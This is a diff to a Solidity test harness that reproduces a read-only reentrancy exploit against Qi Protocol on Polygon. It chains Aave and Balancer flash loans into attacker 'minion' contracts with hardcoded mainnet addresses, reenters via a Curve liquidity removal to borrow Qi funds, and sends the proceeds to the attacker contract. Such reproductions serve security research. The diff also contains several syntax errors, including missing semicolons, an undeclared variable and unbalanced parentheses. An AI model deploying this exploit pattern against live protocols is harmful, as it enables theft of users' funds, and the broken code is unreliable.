@@ -155,6 +155,8 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
     uint256 priceDuringCallback;
     uint256 priceAfterCallback;
 
+    Attacker_Minion_One internal minionOne;
+
     // In reality, the attacker used some minion contracts which they deployed from their
     // main contract to execute the attacks. Here, we simplify and use only one contract
     // and reproduce the attack only to Qi Protocol.
@@ -177,7 +179,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
 
     // Same signature as attacker's
     function run() public {
-        console.log('===== 1. REQUEST FLASHLOAN ON AAVE ======');
+        console.log("===== 1. REQUEST FLASHLOAN ON AAVE ======");
         address[] memory _tokens = new address[](1);
         _tokens[0] = address(WMATIC);
 
@@ -193,7 +195,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
             _amounts,
             _arg3,
             address(this),
-            '',
+            "",
             0
         );
     }
@@ -209,7 +211,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         require(msg.sender == address(aave), "Not called by Aave");
         require(address(WMATIC) == _tokens[0], "Wrong tokens requested");
 
-        console.log('===== 2. REQUEST FLASHLOAN ON BALANCER ======');
+        console.log("===== 2. REQUEST FLASHLOAN ON BALANCER ======");
 
         address[] memory _tokensBalancer = new address[](2);
         _tokensBalancer[0] = address(WMATIC);
@@ -223,30 +225,51 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         priceAtBeginning = get_lp_token_price_for_compound();
         console.log("==== INITIAL PRICE ====");
         console.log(priceAtBeginning);
-        balancer.flashLoan(address(this), _tokensBalancer, _amountsBalancer, "");
+        balancer.flashLoan(
+            address(this),
+            _tokensBalancer,
+            _amountsBalancer,
+            ""
+        );
     }
-
 
     function receiveFlashLoan(
         IERC20[] memory tokens,
         uint256[] memory amounts,
-        uint256[] memory ,
+        uint256[] memory,
         bytes memory
     ) external payable {
         // Sensible requires to aid development
         require(msg.sender == address(balancer), "only callable by balancer");
-        require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
+        require(
+            tokens.length == 2 && tokens.length == amounts.length,
+            "length missmatch"
+        );
         require(address(tokens[0]) == address(WMATIC));
         require(address(tokens[1]) == address(stLIDOMATIC));
 
-        console.log('===== 3. HANDLE BALANCER FLASHLOAN ======');
+        console.log("===== 3. HANDLE BALANCER FLASHLOAN ======");
+
+        console.log("===== 4. Deploy and fund Minion One =====");
+        minionOne = new Attacker_Minion_One(address(this));
+
+        WMATIC.transfer(address(minionOne), WMATIC.balanceOf(address(this)));
+        stLIDOMATIC.transfer(
+            address(minionOne),
+            stLIDOMATIC.balanceOf(address(this))
+        );
+
+        console.log("===== 5. Minion One begins its operations =====");
+        minionOne.borrow();
 
 
+        console.log("===== 6. Deploy Minion Two =====");
+        minionTwo = new Attacker_Minion_Two(address(this));
     }
 
+    receive() external payable {
 
-
-
+    }
 
     // =============================== HELPER FUNCTIONS ===============================
 
@@ -255,4 +278,113 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
     function get_lp_token_price_for_compound() internal view returns (uint256) {
         return PRICE_FEED.getUnderlyingPrice(address(STMATIC_MATIC_DELEGATOR));
     }
+}
+
+contract Attacker_Minion_One {
+    IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
+    IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
+
+    // STLidoMatic/WMATIC Curve pool
+    ICurvePool constant CURVE_STMATIC_POOL =
+        ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
+    IERC20 CURVE_STMATIC_LP_TOKEN =
+        IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
+
+    ICERC20Delegator STMATIC_MATIC_DELEGATOR =
+        ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
+    IVault STMATIC_MATIC_POOL =
+        IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
+
+    IUnitroller UNITROLLER =
+        IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
+
+    // QIDAO Compound delegator and underlying
+    ICERC20Delegator QIDAO_DELEGATOR =
+        ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
+    IERC20 QI_MIMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
+
+    address internal immutable ATTACKER_COMMANDER;
+
+    constructor(address _attackerCommander){
+        ATTACKER_COMMANDER = _attackerCommander;
+    }
+
+    // same signature as attacker's
+    function borrow() external {
+        // Approve WMATIC and stMATIC. Well executed step as it not grants infinite allowance.
+        uint256 initialWMaticBalance = WMATIC.balanceOf(address(this));
+        uint256 initialStLidoMaticBalance = stLIDOMATIC.balanceOf(
+            address(this)
+        );
+
+        WMATIC.approve(address(CURVE_STMATIC_POOL), initialWMaticBalance);
+        stLIDOMATIC.approve(
+            address(CURVE_STMATIC_POOL),
+            initialStLidoMaticBalance
+        );
+
+        // Add Liquidity to Curve Pool
+        uint256[] memory _amounts = new uint256[](2);
+        _amounts[0] = initialWMaticBalance;
+        _amounts[1] = initialStLidoMaticBalance;
+
+        console.log("===== 5.1 Add Liquidity to Curve =====");
+
+        CURVE_STMATIC_POOL.add_liquidity(_amounts, 0, false);
+
+        // Enter market
+        address[] memory _markets = new address[](1);
+        _markets = address(STMATIC_MATIC_DELEGATOR);
+        unitroller.enterMarkets(_markets);
+
+        // Deposit and Mint
+        console.log("===== 5.2 Deposit and Mint =====");
+        CURVE_STMATIC_LP_TOKEN.approve(address(STMATIC_MATIC_POOL), 90000000000000000000000);
+        STMATIC_MATIC_POOL.deposit(90000000000000000000000);
+
+        uint256 stMaticBalance = STMATIC_MATIC_POOL.balanceOf(address(this));
+        STMATIC_MATIC_POOL.approve(address(STMATIC_MATIC_DELEGATOR), stMaticBalance);
+        STMATIC_MATIC_DELEGATOR.mint(stMaticBalance)   
+
+        // Remove liquidity - by setting 'use_eth = true', it will trigger the logic inside receive().
+        console.log("===== 5.2 Deposit and Mint =====");
+        uint256[2] memory minAmounts = [ 0, 0];
+        CURVE_STMATIC_POOL.remove_liquidity(CURVE_STMATIC_LP_TOKEN.balanceOf(address(this), minAmounts, /*use_eth*/ true);
+
+        console.log("===== 5.4 Transfer LP Token to Attacker Contract =====");
+        // This step is curious since the amount transferred is zero... pseudo-automated attack?
+        CURVE_STMATIC_LP_TOKEN.transfer(ATTACKER_COMMANDER, CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)));
+
+        console.log("===== 5.5 Transfer Natives to Attacker Contract =====");
+        (bool success, ) = ATTACKER_COMMANDER.call{address(this).balance}('');
+        require(success, 'native tx fail: Minion 1 to Commander')
+
+        console.log("===== 5.6 Transfer WMATIC to Attacker Contract =====");
+        // Same comment as 5.4
+        WMATIC.transfer(ATTACKER_COMMANDER, WMATIC.balanceOf(address(this))); 
+
+        console.log("===== 5.7 Transfer stLIDOMATIC to Attacker Contract =====");
+        stLIDOMATIC.transfer(ATTACKER_COMMANDER, stLIDOMATIC.balanceOf(address(this))); 
+
+        console.log("===== 5.8 Transfer Qi MiMatic to Attacker Contract =====");
+        QI_MIMATIC.transfer(ATTACKER_COMMANDER, QI_MIMATIC.balanceOf(address(this))); 
+    }
+
+
+    receive() external payable {
+        console.log("===== 5.3 Reentrant Call: Borrow Qi =====");
+        QIDAO_DELEGATOR.borrow(249000000000000000000000);
+    }
+}
+
+
+contract Attacker_Minion_Two {
+    
+    address internal immutable ATTACKER_COMMANDER;
+
+    constructor(address _attackerCommander){
+        ATTACKER_COMMANDER = _attackerCommander;
+    }
+
+
 }
